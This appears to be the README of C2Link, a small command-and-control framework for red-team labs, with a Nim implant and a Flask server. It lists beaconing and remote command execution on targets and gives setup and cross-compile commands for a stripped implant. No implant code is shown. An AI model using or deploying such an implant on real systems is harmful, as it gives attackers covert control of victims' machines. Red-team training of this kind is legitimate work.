# C2Link

A lightweight Command & Control (C2) framework for red teaming labs and educational purposes.  
**c2link** written in **Nim**, **Team Server** written in **Python (Flask)**.

## Features

- ✅ HTTP beaconing (polling every 5 seconds)
  
- ✅ Execute system commands on target
  
- ✅ Web dashboard to send commands and view output
  
- ✅ Configurable server IP (passed as argument)
  
- ✅ Cross‑platform implant (Linux, macOS, Windows via cross‑compile)


## Quick Start

### 1. Start the C2 server (attacker machine)

```bash
cd server
pip3 install flask
python3 c2link_server.py

Server listens on http://0.0.0.0:5000

nim c c2link.nim ( only compile )

nim c -r c2link.nim ( compile + start c2 )


For Linux / macOS (native):
cd implant
nim c -d:release --opt:size --strip c2link.nim

For Windows (cross‑compile from Linux/macOS):
nim c -d:mingw --cpu:amd64 -d:release --opt:size --strip -o:c2link.exe c2link.nim


./c2link 192.x.x.x insert the target ip ( default 127.0.0.1 )

open localhost:5000 control panel

command es whoami, ls 
